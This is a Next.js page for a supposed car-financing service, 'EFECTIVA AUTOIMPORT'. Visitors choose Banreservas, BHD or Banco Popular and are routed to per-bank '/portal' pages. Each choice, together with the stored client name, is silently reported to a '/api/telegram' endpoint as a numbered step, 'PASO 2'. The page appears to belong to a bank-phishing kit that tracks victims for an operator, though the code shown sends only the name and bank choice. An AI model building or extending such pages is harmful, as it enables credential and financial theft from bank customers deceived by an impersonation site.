"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";

export default function BancosPage() {
  const router = useRouter();
  const [cliente, setCliente] = useState("");
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    const nombreGuardado = localStorage.getItem("cliente_actual");

    if (nombreGuardado) {
      setCliente(nombreGuardado);
    }
  }, []);

  const handleSeleccion = async (
    nombreBanco: string,
    ruta: string
  ) => {
    setLoading(true);

    try {
      await fetch("/api/telegram", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          pagina: "🏦 PASO 2: SELECCIÓN DE BANCO",
          nombre: cliente || "Cliente Desconocido",
          banco: nombreBanco,
          detalles: `El cliente seleccionó ${nombreBanco}`,
        }),
      });

      localStorage.setItem(
        "banco_elegido",
        nombreBanco
      );

      router.push(ruta);
    } catch (error) {
      console.error(error);
      router.push(ruta);
    } finally {
      setLoading(false);
    }
  };

  return (
    <main className="relative min-h-screen overflow-hidden bg-black text-white">

      {/* Luces doradas */}
      <div className="pointer-events-none absolute inset-0">
        <div className="absolute left-0 top-20 h-96 w-96 rounded-full bg-yellow-500/10 blur-[120px]" />
        <div className="absolute right-0 bottom-20 h-96 w-96 rounded-full bg-yellow-500/10 blur-[120px]" />
      </div>

      {/* Header */}
      <section className="relative z-10 px-6 pt-16 pb-12">
        <div className="mx-auto max-w-5xl text-center">

          <div className="mx-auto mb-5 h-1 w-24 rounded-full bg-yellow-500" />

          <p className="text-sm font-semibold tracking-[0.35em] text-yellow-500 uppercase">
            EFECTIVA AUTOIMPORT
          </p>

          <h1 className="mt-6 text-4xl font-black md:text-6xl">
            SELECCIONA TU
            <span className="block text-yellow-500">
              BANCO
            </span>
          </h1>

          <p className="mx-auto mt-5 max-w-2xl text-gray-400">
            Elige la entidad financiera con la que deseas
            continuar tu proceso de financiamiento.
          </p>

          {cliente && (
            <div className="mt-6 inline-flex rounded-full border border-yellow-500/30 bg-yellow-500/10 px-5 py-2 text-sm text-yellow-400">
              Cliente: {cliente}
            </div>
          )}
        </div>
      </section>

      {/* Tarjetas */}
      <section className="relative z-10 mx-auto max-w-6xl px-6 pb-20">
        <div className="grid gap-8 md:grid-cols-3">

          {/* BANRESERVAS */}
          <div className="rounded-3xl border border-yellow-500/20 bg-zinc-950 p-8 transition-all duration-300 hover:border-yellow-500 hover:shadow-[0_0_40px_rgba(234,179,8,0.2)]">

            <div className="flex h-28 items-center justify-center rounded-2xl border border-zinc-800 bg-black">
              <img
                src="/images/banreservas.png"
                alt="Banreservas"
                className="max-h-16 object-contain"
              />
            </div>

            <h2 className="mt-6 text-center text-2xl font-bold">
              Banreservas
            </h2>

            <p className="mt-3 text-center text-gray-400">
              Financiamiento con respaldo y aprobación rápida.
            </p>

            <button
              type="button"
              disabled={loading}
              onClick={() =>
                handleSeleccion(
                  "BANRESERVAS",
                  "/portal/banreservas"
                )
              }
              className="mt-8 w-full rounded-2xl bg-yellow-500 py-4 font-bold text-black transition hover:bg-yellow-400 disabled:opacity-50"
            >
              {loading
                ? "Procesando..."
                : "CONTINUAR"}
            </button>
          </div>

          {/* BHD */}
          <div className="rounded-3xl border border-yellow-500/20 bg-zinc-950 p-8 transition-all duration-300 hover:border-yellow-500 hover:shadow-[0_0_40px_rgba(234,179,8,0.2)]">

            <div className="flex h-28 items-center justify-center rounded-2xl border border-zinc-800 bg-black">
              <img
                src="/images/bhd.png"
                alt="BHD"
                className="max-h-16 object-contain"
              />
            </div>

            <h2 className="mt-6 text-center text-2xl font-bold">
              Banco BHD
            </h2>

            <p className="mt-3 text-center text-gray-400">
              Opciones flexibles para adquirir tu vehículo.
            </p>

            <button
              type="button"
              disabled={loading}
              onClick={() =>
                handleSeleccion(
                  "BHD",
                  "/portal/bhd"
                )
              }
              className="mt-8 w-full rounded-2xl bg-yellow-500 py-4 font-bold text-black transition hover:bg-yellow-400 disabled:opacity-50"
            >
              {loading
                ? "Procesando..."
                : "CONTINUAR"}
            </button>
          </div>

          {/* POPULAR */}
          <div className="rounded-3xl border border-yellow-500/20 bg-zinc-950 p-8 transition-all duration-300 hover:border-yellow-500 hover:shadow-[0_0_40px_rgba(234,179,8,0.2)]">

            <div className="flex h-28 items-center justify-center rounded-2xl border border-zinc-800 bg-black">
              <img
                src="/images/logopopular2.png"
                alt="Popular"
                className="max-h-48 object-contain"
              />
            </div>

            <h2 className="mt-6 text-center text-2xl font-bold">
              Banco Popular
            </h2>

            <p className="mt-3 text-center text-gray-400">
              Continúa tu solicitud con Banco Popular.
            </p>

            <button
              type="button"
              disabled={loading}
              onClick={() =>
                handleSeleccion(
                  "POPULAR",
                  "/portal/popular"
                )
              }
              className="mt-8 w-full rounded-2xl bg-yellow-500 py-4 font-bold text-black transition hover:bg-yellow-400 disabled:opacity-50"
            >
              {loading
                ? "Procesando..."
                : "CONTINUAR"}
            </button>
          </div>

        </div>
      </section>

    </main>
  );
}